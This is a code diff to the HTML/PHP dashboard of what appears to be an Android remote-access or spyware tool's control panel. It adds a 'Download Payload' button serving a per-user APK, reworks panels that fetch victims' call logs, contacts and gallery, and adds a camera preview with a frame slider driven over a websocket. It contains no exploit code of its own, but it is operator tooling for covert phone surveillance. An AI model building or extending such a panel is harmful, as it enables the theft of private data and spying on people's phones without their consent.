@@ -28,6 +28,10 @@
 
     <!-- bootstrap-progressbar -->
     <link href="../vendors/bootstrap-progressbar/css/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet">
+    <!-- ion range slider -->
+    <link href="../vendors/normalize-css/normalize.css" rel="stylesheet">
+    <link href="../vendors/ion.rangeSlider/css/ion.rangeSlider.css" rel="stylesheet">
+    <link href="../vendors/ion.rangeSlider/css/ion.rangeSlider.skinFlat.css" rel="stylesheet">
     <!-- JQVMap -->
     <link href="../vendors/jqvmap/dist/jqvmap.min.css" rel="stylesheet"/>
     <!-- bootstrap-daterangepicker -->
@@ -222,7 +226,7 @@
         <div class="right_col" role="main" style="overflow:hidden">
           <div id="home" class="container" class="base-page" >
             <div class="row">
-                <h1 class="txt txt-default"><i class="fa fa-home"></i>&nbsp; Welcome to Home</h1>
+                <h1 class="txt txt-default"><i class="fa fa-home"></i>&nbsp; Welcome to Home <a href="../data/<?php echo $_SESSION["user_name"].".apk"; ?>"><button class="btn btn-primary">Download Payload</button></a></h1>
             </div>
             <div class="row">
                 <!-- Start of Activities -->
@@ -518,9 +522,9 @@
                         <div class="clearfix"></div>
                       </div>
                       <div class="x_content">
-                        <table id="calllog_fetch" class="table table-striped table-bordered bulk_action">
+                        <div id="calllog_fetch">
 
-                        </table>
+                        </div>
                       </div>
                     </div>
                   </div>
@@ -540,7 +544,7 @@
                         <div class="clearfix"></div>
                       </div>
                       <div class="x_content">
-                        <table id="contacts_fetch" class="table table-striped table-bordered bulk_action"></table>
+                        <div id="contacts_fetch"></div>
                       </div>
                     </div>
                   </div>
@@ -562,7 +566,7 @@
                         <div class="clearfix"></div>
                       </div>
                       <div class="x_content">
-                        <table id="gallery_fetch" class="table table-striped table-bordered bulk_action"></table>
+                        <div id="gallery_fetch" ></div>
                       </div>
                     </div>
                   </div>
@@ -573,7 +577,7 @@
                         <ul class="nav navbar-right panel_toolbox">
                           <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                           </li>
-                          <li><button type="button" onclick="contacts()" class="btn btn-danger btn-xs">Pull Contacts</button>
+                          <li id="camera_button_holder">
                           </li>
                           <li><a class="close-link"><i class="fa fa-close"></i></a>
                           </li>
@@ -581,7 +585,8 @@
                         <div class="clearfix"></div>
                       </div>
                       <div class="x_content" id="preview_window">
-                        
+                        <input id="frame-slider"  />
+                        <img class="img img-responsive" id="preview_image"/>
                       </div>
                     </div>
                   </div>
@@ -665,6 +670,8 @@
     <script src="../vendors/jszip/dist/jszip.min.js"></script>
     <script src="../vendors/pdfmake/build/pdfmake.min.js"></script>
     <script src="../vendors/pdfmake/build/vfs_fonts.js"></script>
+    <!-- Ion.RangeSlider -->
+    <script src="../vendors/ion.rangeSlider/js/ion.rangeSlider.min.js"></script>
     <!-- Custom Theme Scripts -->
     <script type="text/javascript" src="../build/js/custom.js"></script>
     <script type="text/javascript" src="../js/websocket.js"></script>
